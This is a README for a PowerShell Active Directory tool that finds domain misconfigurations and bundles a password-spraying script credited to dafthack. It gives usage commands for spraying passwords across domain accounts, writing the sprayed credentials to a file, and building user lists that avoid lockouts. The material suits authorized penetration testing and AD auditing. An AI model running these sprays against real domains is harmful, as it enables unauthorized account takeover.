[](guidance.png)

# Miscon
PowerShell script to find misconfigurations in an active directory and can be used for domain password sprays.

## Functions
### Find-Misconfigurations

```PowerShell
-Domain = defines the domain
-Type = defines the type (default = light | other types: extended, quickwins)
```

```PowerShell
Find-Misconfigurations -Domain "test.local"
Find-Misconfigurations -Domain "test.local" -Type "light"
Find-Misconfigurations -Domain "test.local" -Type "extended"
Find-Misconfigurations -Domain "test.local" -Type "quickwins"
```

### DomainPasswordSpray
All Credits goes to dafthack, copied his DomainPasswordSpray PowerShell script, because it is awesome.

```PowerShell
# single password spray
Invoke-DomainPasswordSpray -Password Spring2017

# uses userlist and passwordlist, creating outfile
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

# using userlist and one password, creating outfile
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -Password Summer2017 -OutFile sprayed-creds.txt

# creating userlist out of the domain
Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
```
